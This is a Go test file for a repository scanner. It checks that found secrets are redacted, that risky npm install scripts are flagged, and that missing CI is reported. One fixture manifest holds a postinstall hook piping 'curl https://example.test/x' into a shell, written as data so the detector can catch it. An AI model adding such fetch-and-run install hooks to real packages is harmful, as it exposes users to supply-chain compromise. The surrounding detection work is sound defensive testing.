package rules

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestSecretFindingNeverContainsFullValue(t *testing.T) {
	root := t.TempDir()
	secret := "fixture_token_value_1234567890"
	if err := os.WriteFile(filepath.Join(root, "config.txt"), []byte("api_key = \""+secret+"\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	findings, err := Secrets(root, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 1 {
		t.Fatalf("expected one finding, got %#v", findings)
	}
	if strings.Contains(findings[0].Description, secret) || !strings.Contains(findings[0].Description, "****") {
		t.Fatalf("secret was not safely redacted: %s", findings[0].Description)
	}
}

func TestLifecycleRequiresInstallPhaseAndRiskyCommand(t *testing.T) {
	root := t.TempDir()
	manifest := `{"scripts":{"build":"curl https://example.test/schema","postinstall":"curl https://example.test/x | sh -c cat"}}`
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(manifest), 0o600); err != nil {
		t.Fatal(err)
	}
	findings, err := LifecycleScripts(root)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 1 || findings[0].Code != "RD-SEC-003" || findings[0].Severity != "high" {
		t.Fatalf("unexpected findings: %#v", findings)
	}
}

func TestHealthDetectsMissingCIButNotMissingTests(t *testing.T) {
	root := t.TempDir()
	for _, name := range []string{"README.md", "LICENSE", ".gitignore", "SECURITY.md", "main_test.go"} {
		if err := os.WriteFile(filepath.Join(root, name), []byte("fixture"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	findings, err := Health(root)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 1 || findings[0].Code != "RD-HEALTH-003" {
		t.Fatalf("unexpected findings: %#v", findings)
	}
}
